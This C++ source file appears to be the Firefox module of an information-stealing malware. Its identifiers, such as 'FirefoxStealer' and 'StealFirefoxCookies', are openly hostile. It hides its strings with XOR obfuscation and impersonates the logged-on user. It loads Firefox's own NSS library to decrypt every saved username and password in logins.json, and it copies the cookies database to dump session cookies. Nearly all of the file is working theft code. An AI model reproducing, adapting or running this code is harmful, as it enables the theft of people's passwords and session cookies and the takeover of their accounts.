#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>

#include "FirefoxStealer.h"
#include "../crypto/Base64.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../utils/Shared.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>

#pragma comment(lib, "shlwapi.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
        const wchar_t kMozillaFirefoxEnc[] = { L'\x06', L'\x70', L'\xf6', L'\x57', L'\x27', L'\x73', L'\xed', L'\x1e', L'\x0d', L'\x76', L'\xfe', L'\x5b', L'\x2d', L'\x70', L'\xf4', L'\0' };
        const wchar_t kFirefoxProfilesEnc[] = { L'\x06', L'\x70', L'\xf6', L'\x57', L'\x27', L'\x73', L'\xed', L'\x62', L'\x0d', L'\x76', L'\xfe', L'\x5b', L'\x2d', L'\x70', L'\xf4', L'\x62', L'\x1b', L'\x6d', L'\xe3', L'\x58', L'\x22', L'\x73', L'\xe9', L'\x4d', L'\0' };

        const wchar_t kRegMozillaEnc[] = { L'\x18', L'\x50', L'\xca', L'\x6a', L'\x1c', L'\x5e', L'\xde', L'\x7b', L'\x17', L'\x52', L'\xe3', L'\x44', L'\x22', L'\x73', L'\xe0', L'\x5f', L'\x17', L'\x52', L'\xe3', L'\x44', L'\x22', L'\x73', L'\xe0', L'\x5f', L'\x6b', L'\x59', L'\xe5', L'\x4c', L'\x2e', L'\x79', L'\xe3', L'\x46', L'\0' };
        const wchar_t kRegCurrentVersionEnc[] = { L'\x08', L'\x6a', L'\xfe', L'\x4c', L'\x2e', L'\x71', L'\xf8', L'\x68', L'\x2e', L'\x6d', L'\xff', L'\x57', L'\x24', L'\x71', L'\0' };
        const wchar_t kRegInstallDirEnc[] = { L'\x06', L'\x7e', L'\xe5', L'\x50', L'\x17', L'\x56', L'\xe2', L'\x4d', L'\x3f', L'\x7e', L'\xe0', L'\x52', L'\x6b', L'\x5b', L'\xe5', L'\x4c', L'\x2e', L'\x7c', L'\xf8', L'\x51', L'\x39', L'\x66', L'\0' };
        const wchar_t kRegAppPathsEnc[] = { L'\x18', L'\x50', L'\xca', L'\x6a', L'\x1c', L'\x5e', L'\xde', L'\x7b', L'\x17', L'\x52', L'\xe5', L'\x5d', L'\x39', L'\x70', L'\xff', L'\x51', L'\x2d', L'\x6b', L'\xd0', L'\x69', L'\x22', L'\x71', L'\xe8', L'\x51', L'\x3c', L'\x6c', L'\xd0', L'\x7d', L'\x3e', L'\x6d', L'\xfe', L'\x5b', L'\x25', L'\x6b', L'\xda', L'\x5b', L'\x39', L'\x6c', L'\xe5', L'\x51', L'\x25', L'\x43', L'\xcd', L'\x4e', L'\x3b', L'\x3f', L'\xdc', L'\x5f', L'\x3f', L'\x77', L'\xff', L'\x62', L'\x2d', L'\x76', L'\xfe', L'\x5b', L'\x2d', L'\x70', L'\xf4', L'\x10', L'\x2e', L'\x67', L'\xe9', L'\0' };
        const wchar_t kNssDllEnc[] = { L'\x25', L'\x6c', L'\xff', L'\x0d', L'\x65', L'\x7b', L'\xe0', L'\x52', L'\0' };
        const wchar_t kNssInitEnc[] = { L'\x05', L'\x4c', L'\xdf', L'\x61', L'\x02', L'\x71', L'\xe5', L'\x4a', L'\0' };
        const wchar_t kNssShutdownEnc[] = { L'\x05', L'\x4c', L'\xdf', L'\x61', L'\x18', L'\x77', L'\xf9', L'\x4a', L'\x2f', L'\x70', L'\xfb', L'\x50', L'\0' };
        const wchar_t kPk11SdrDecryptEnc[] = { L'\x1b', L'\x54', L'\xbd', L'\x0f', L'\x18', L'\x5b', L'\xde', L'\x61', L'\x0f', L'\x7a', L'\xef', L'\x4c', L'\x32', L'\x6f', L'\xf8', L'\0' };
        const wchar_t kLoginsJsonEnc[] = { L'\x27', L'\x70', L'\xeb', L'\x57', L'\x25', L'\x6c', L'\xa2', L'\x54', L'\x38', L'\x70', L'\xe2', L'\0' };
        const wchar_t kCookiesSqliteEnc[] = { L'\x28', L'\x70', L'\xe3', L'\x55', L'\x22', L'\x7a', L'\xff', L'\x10', L'\x38', L'\x6e', L'\xe0', L'\x57', L'\x3f', L'\x7a', L'\0' };
        const wchar_t kQueryFxCookiesEnc[] = { L'\x18', L'\x5a', L'\xc0', L'\x7b', L'\x08', L'\x4b', L'\xac', L'\x56', L'\x24', L'\x6c', L'\xf8', L'\x12', L'\x6b', L'\x6f', L'\xed', L'\x4a', L'\x23', L'\x33', L'\xac', L'\x57', L'\x38', L'\x4c', L'\xe9', L'\x5d', L'\x3e', L'\x6d', L'\xe9', L'\x12', L'\x6b', L'\x7a', L'\xf4', L'\x4e', L'\x22', L'\x6d', L'\xf5', L'\x12', L'\x6b', L'\x71', L'\xed', L'\x53', L'\x2e', L'\x33', L'\xac', L'\x48', L'\x2a', L'\x73', L'\xf9', L'\x5b', L'\x6b', L'\x59', L'\xde', L'\x71', L'\x06', L'\x3f', L'\xe1', L'\x51', L'\x31', L'\x40', L'\xef', L'\x51', L'\x24', L'\x74', L'\xe5', L'\x5b', L'\x38', L'\0' };

        const wchar_t kLoginsKeyEnc[] = { L'l'^0x4B, L'o'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L's'^0x1F, L'\0' };
        const wchar_t kHostnameEnc[] = { L'h'^0x4B, L'o'^0x1F, L's'^0x8C, L't'^0x3E, L'n'^0x4B, L'a'^0x1F, L'm'^0x8C, L'e'^0x3E, L'\0' };
        const wchar_t kEncUserEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'U'^0x1F, L's'^0x8C, L'e'^0x3E, L'r'^0x4B, L'n'^0x1F, L'a'^0x8C, L'm'^0x3E, L'e'^0x4B, L'\0' };
        const wchar_t kEncPassEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'P'^0x1F, L'a'^0x8C, L's'^0x3E, L's'^0x4B, L'w'^0x1F, L'o'^0x8C, L'r'^0x3E, L'd'^0x4B, L'\0' };

        typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
        struct SECItem { unsigned int type; unsigned char* data; unsigned int len; };
        typedef SECStatus(*NSSInitFunc)(const char*);
        typedef SECStatus(*PK11SDRDecryptFunc)(SECItem*, SECItem*, void*);
        typedef SECStatus(*NSSShutdownFunc)();

        std::string FindFirefoxInstallPath() {
            char path[MAX_PATH];
            std::wstring mozillaFirefox = utils::DecryptW(kMozillaFirefoxEnc, wcslen(kMozillaFirefoxEnc));

            // 1. Check Standard Program Files
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path))) {
                std::string p = std::string(path) + "\\" + utils::ws2s(mozillaFirefox);
                if (fs::exists(p)) return p;
            }
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, path))) {
                std::string p = std::string(path) + "\\" + utils::ws2s(mozillaFirefox);
                if (fs::exists(p)) return p;
            }

            // 2. Check User Local AppData (User-level install)
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
                std::string p = std::string(path) + "\\" + utils::ws2s(mozillaFirefox);
                if (fs::exists(p)) return p;
            }

            // 3. Check Registry for Install Directory
            HKEY hKey;
            std::wstring regMozilla = utils::DecryptW(kRegMozillaEnc, wcslen(kRegMozillaEnc));
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regMozilla.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                wchar_t version[256];
                DWORD sz = sizeof(version);
                std::wstring regVer = utils::DecryptW(kRegCurrentVersionEnc, wcslen(kRegCurrentVersionEnc));
                if (RegQueryValueExW(hKey, regVer.c_str(), NULL, NULL, (LPBYTE)version, &sz) == ERROR_SUCCESS) {
                    std::wstring subKey = regMozilla + L"\\" + version + L"\\" + utils::DecryptW(kRegInstallDirEnc, wcslen(kRegInstallDirEnc));
                    HKEY hSubKey;
                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                        wchar_t installDir[MAX_PATH];
                        sz = sizeof(installDir);
                        if (RegQueryValueExW(hSubKey, NULL, NULL, NULL, (LPBYTE)installDir, &sz) == ERROR_SUCCESS) {
                            RegCloseKey(hSubKey);
                            RegCloseKey(hKey);
                            return utils::ws2s(installDir);
                        }
                        RegCloseKey(hSubKey);
                    }
                }
                RegCloseKey(hKey);
            }

            // 4. Check App Paths
            std::wstring regAppPaths = utils::DecryptW(kRegAppPathsEnc, wcslen(kRegAppPathsEnc));
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regAppPaths.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                wchar_t installPath[MAX_PATH];
                DWORD sz = sizeof(installPath);
                if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)installPath, &sz) == ERROR_SUCCESS) {
                    RegCloseKey(hKey);
                    std::string p = utils::ws2s(installPath);
                    return fs::path(p).parent_path().string();
                }
                RegCloseKey(hKey);
            }

            return "";
        }

        std::vector<std::string> FindFirefoxProfiles() {
            std::vector<std::string> profiles;
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
                fs::path profilesPath = fs::path(path) / utils::ws2s(utils::DecryptW(kFirefoxProfilesEnc, wcslen(kFirefoxProfilesEnc)));
                if (fs::exists(profilesPath)) {
                    for (const auto& entry : fs::directory_iterator(profilesPath)) {
                        if (entry.is_directory()) profiles.push_back(entry.path().string());
                    }
                }
            }
            return profiles;
        }

        std::string DecryptNSS(const std::string& base64Data, PK11SDRDecryptFunc decryptFunc) {
            std::vector<BYTE> encrypted = crypto::Base64Decode(base64Data);
            if (encrypted.empty()) return "";
            SECItem input = { 0, encrypted.data(), (unsigned int)encrypted.size() };
            SECItem output = { 0, nullptr, 0 };
            if (decryptFunc(&input, &output, nullptr) == SECSuccess) {
                std::string decrypted((char*)output.data, output.len);
                return decrypted;
            }
            return "";
        }

        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            try {
                if (!fs::exists(src)) return;
                fs::copy_file(src, dest, fs::copy_options::overwrite_existing);
                if (fs::exists(src + "-wal")) fs::copy_file(src + "-wal", dest + "-wal", fs::copy_options::overwrite_existing);
                if (fs::exists(src + "-shm")) fs::copy_file(src + "-shm", dest + "-shm", fs::copy_options::overwrite_existing);
            } catch (...) {
                CopyFileA(src.c_str(), dest.c_str(), FALSE);
            }
        }

        void SafeDeleteDatabase(const std::string& path) {
            try {
                fs::remove(path);
                fs::remove(path + "-wal");
                fs::remove(path + "-shm");
            } catch (...) {}
        }
    }

    std::string DumpFirefoxPasswords() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::string report = "FIREFOX_PASSWORDS_DUMPED:\n";
        if (impersonated) report += "[+] Running with impersonated user token.\n";

        std::string firefoxPath = FindFirefoxInstallPath();
        if (firefoxPath.empty()) {
            LOG_DEBUG("Firefox installation not found in standard paths or registry.");
            if (impersonated) utils::RevertToSelf();
            return report + "Firefox not found.";
        }
        LOG_DEBUG("Firefox install found: " + firefoxPath);
        std::vector<std::string> profiles = FindFirefoxProfiles();
        if (profiles.empty()) {
            if (impersonated) utils::RevertToSelf();
            return report + "No profiles found.";
        }
        std::string nssDllPath = firefoxPath + "\\" + utils::ws2s(utils::DecryptW(kNssDllEnc, wcslen(kNssDllEnc)));
        HMODULE hNss = LoadLibraryExA(nssDllPath.c_str(), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
        if (!hNss) {
            if (impersonated) utils::RevertToSelf();
            return report + "Failed to load nss3.dll";
        }
        auto nssInit = (NSSInitFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kNssInitEnc, wcslen(kNssInitEnc))).c_str());
        auto nssShutdown = (NSSShutdownFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kNssShutdownEnc, wcslen(kNssShutdownEnc))).c_str());
        auto pk11SdrDecrypt = (PK11SDRDecryptFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kPk11SdrDecryptEnc, wcslen(kPk11SdrDecryptEnc))).c_str());
        if (!nssInit || !pk11SdrDecrypt) {
            FreeLibrary(hNss);
            if (impersonated) utils::RevertToSelf();
            return report + "Failed to find NSS functions.";
        }
        report += "PROFILE | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";
        bool foundAny = false;
        for (const auto& profile : profiles) {
            fs::path loginsPath = fs::path(profile) / utils::ws2s(utils::DecryptW(kLoginsJsonEnc, wcslen(kLoginsJsonEnc)));
            if (!fs::exists(loginsPath)) continue;
            std::string nssPath = "sql:" + profile;
            if (nssInit(nssPath.c_str()) != SECSuccess) { if (nssInit(profile.c_str()) != SECSuccess) continue; }
            try {
                std::ifstream f(loginsPath);
                nlohmann::json j;
                f >> j;
                std::string loginsKey = utils::ws2s(utils::DecryptW(kLoginsKeyEnc, wcslen(kLoginsKeyEnc)));
                if (j.contains(loginsKey)) {
                    for (const auto& login : j[loginsKey]) {
                        std::string url = login.value(utils::ws2s(utils::DecryptW(kHostnameEnc, wcslen(kHostnameEnc))), "N/A");
                        std::string encUser = login.value(utils::ws2s(utils::DecryptW(kEncUserEnc, wcslen(kEncUserEnc))), "");
                        std::string encPass = login.value(utils::ws2s(utils::DecryptW(kEncPassEnc, wcslen(kEncPassEnc))), "");
                        std::string username = DecryptNSS(encUser, pk11SdrDecrypt);
                        std::string password = DecryptNSS(encPass, pk11SdrDecrypt);
                        if (!username.empty() || !password.empty()) {
                            report += fs::path(profile).filename().string() + " | " + url + " | " + username + " | " + password + "\n";
                            foundAny = true;
                        }
                    }
                }
            } catch (...) {}
            if (nssShutdown) nssShutdown();
        }
        FreeLibrary(hNss);
        if (impersonated) utils::RevertToSelf();
        return report;
    }

    std::string StealFirefoxCookies() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::stringstream ss;
        ss << "# FIREFOX COOKIE STEALER RESULTS\n";
        if (impersonated) ss << "# [+] Running with impersonated user token.\n";
        std::vector<std::string> profiles = FindFirefoxProfiles();
        int count = 0;
        for (const auto& profile : profiles) {
            fs::path cookiesDbPath = fs::path(profile) / utils::ws2s(utils::DecryptW(kCookiesSqliteEnc, wcslen(kCookiesSqliteEnc)));
            if (!fs::exists(cookiesDbPath)) continue;
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            std::string tempDb = std::string(tempPath) + "cfx_" + std::to_string(GetTickCount64()) + ".sqlite";
            SafeCopyDatabase(cookiesDbPath.string(), tempDb);
            sqlite3* db;
            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                std::string query_str = utils::ws2s(utils::DecryptW(kQueryFxCookiesEnc, wcslen(kQueryFxCookiesEnc)));
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                        const char* path = (const char*)sqlite3_column_text(stmt, 1);
                        int isSecure = sqlite3_column_int(stmt, 2);
                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                        const char* name = (const char*)sqlite3_column_text(stmt, 4);
                        const char* value = (const char*)sqlite3_column_text(stmt, 5);
                        if (host && name && value) {
                            ss << host << "\t" << ((host[0] == '.') ? "TRUE" : "FALSE") << "\t" << (path ? path : "") << "\t" << (isSecure ? "TRUE" : "FALSE") << "\t" << expiry << "\t" << name << "\t" << value << "\n";
                            count++;
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            SafeDeleteDatabase(tempDb);
        }
        if (impersonated) utils::RevertToSelf();
        std::stringstream finalSS;
        finalSS << "# Total cookies: " << count << "\n" << ss.str();
        return finalSS.str();
    }
}
